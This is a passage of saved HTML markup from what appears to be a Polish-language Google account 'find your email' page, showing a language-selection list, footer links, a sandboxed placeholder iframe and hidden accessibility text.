                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=tr aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Türkçe‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=el aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Ελληνικά‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=bg aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪български‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=mk aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪македонски‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=mn aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪монгол‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ru aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Русский‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=sr aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪српски (ћирилица)‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=uk aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪Українська‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ka aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ქართული‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=hy aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪հայերեն‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=iw aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‫עברית‬‎</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ur aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‫اردو‬‎</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ar aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‫العربية‬‎</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=fa aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‫فارسی‬‎</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=am aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪አማርኛ‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ne aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪नेपाली‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=mr aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪मराठी‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=hi aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪हिन्दी‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=bn aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪বাংলা‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=pa aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ਪੰਜਾਬੀ‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=gu aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ગુજરાતી‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ta aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪தமிழ்‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=te aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪తెలుగు‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=kn aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ಕನ್ನಡ‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ml aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪മലയാളം‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=si aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪සිංහල‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=th aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ไทย‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=lo aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ລາວ‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=my aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪မြန်မာ‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=km aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪ខ្មែរ‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ko aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪한국어‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=zh-HK aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪中文（香港）‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=ja aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪日本語‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=zh-CN aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪简体中文‬</span>
                            </div>
                            <div class="MocG8c B9IrJb LMgvRb" jsname=wQNmvb jsaction data-value=zh-TW aria-selected=false role=option tabindex=-1>
                                <div class="kRoyt MbhUzd sf-hidden" jsname=ksKsZd></div>
                                <span jsslot class="vRMGwf oJeWuf">‪繁體中文‬</span>
                            </div>
                        </div>
                        <div class="CeEBt Ce1Y1c eU809d" role=presentation>
                            <div class=TquXA></div>
                        </div>
                    </div>
                    <div class="OA0qNb ncFHed" jsaction="click:dPTK6c(wQNmvb); mousedown:uYU8jb(wQNmvb); mouseup:LVEdXd(wQNmvb); mouseover:nfXz1e(wQNmvb); touchstart:Rh2fre(wQNmvb); touchmove:hvFWtf(wQNmvb); touchend:MkF9r(wQNmvb|preventMouseEvents=true)" role=presentation jsname=V68bde style=display:none soy-skip ssk=6:Rxil4c></div>
                </div>
            </div>
            <ul class=Bgzgmd>
                <li>
                    <a href="https://support.google.com/accounts?hl=pl&amp;p=account_iph" target=_blank>Pomoc</a>
                <li>
                    <a href="https://accounts.google.com/TOS?loc=PL&amp;hl=pl&amp;privacy=true" target=_blank>Prywatność</a>
                <li>
                    <a href="https://accounts.google.com/TOS?loc=PL&amp;hl=pl" target=_blank>Warunki</a>
            </ul>
        </footer>
    </div>
    <div class=VmOpGe aria-hidden=true></div>
    </div>
    <div data-check-connection='%.@.null,null,"youtube",[["https://accounts.youtube.com/accounts/CheckConnection?pmpo\u003dhttps%3A%2F%2Faccounts.google.com\u0026v\u003d-1532454503","youtube"]]]' jsaction=rcuQ6b:WYd jscontroller=GfN5Qc></div>
    <div class=lDwpOe></div>
    <iframe height=0 width=0 tabindex=-1 style=position:absolute;left:0px;top:0px;z-index:-1 sandbox="allow-popups allow-top-navigation allow-top-navigation-by-user-activation" srcdoc="
													<html style>
														<meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:;&quot;>
															<style>img[src=&quot;data:,&quot;],source[src=&quot;data:,&quot;]{display:none!important}</style>">
    </iframe>
    <div aria-live=assertive aria-relevant=additions aria-atomic=true aria-hidden=true style=color:transparent;z-index:-1;position:absolute;top:0px;left:0px;user-select:none>
        <div aria-atomic=true>Znajdź swój adres e-mail Wpisz numer telefonu lub adres pomocniczy </div>
    </div>